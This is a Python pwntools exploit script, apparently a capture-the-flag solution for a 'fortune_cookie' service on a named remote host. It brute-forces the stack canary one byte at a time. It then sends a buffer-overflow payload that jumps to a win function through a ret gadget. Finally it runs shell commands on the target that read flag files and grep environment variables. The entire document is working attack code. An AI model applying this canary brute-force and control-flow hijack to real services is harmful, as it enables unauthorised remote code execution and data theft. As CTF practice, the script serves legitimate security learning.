#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = 'offsec.m0lecon.it', 13511
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88

elf = ELF('./fortune_cookie', checksec=False)

known = b"\x00"

for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"wish\n")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"OK" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

commands = [
    b'cat /flag',
    b'cat /flag.txt', 
    b'cat /root/flag',
    b'cat /home/user/flag',
    b'find / -name "flag*" 2>/dev/null',
    b'env | grep -i flag',
]

for cmd in commands:

    io = remote(HOST, PORT)
    io.recvuntil(b"wish\n")

    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(0x000000000040101a),    # ret gadget for alignment
        p64(elf.sym.win),
    )
    io.send(payload)
    io.recvuntil(b'fortune:\n')
    io.sendline(cmd)
    result = io.recv(timeout = 1)

    if result:
        print(f"{result}")
    io.close()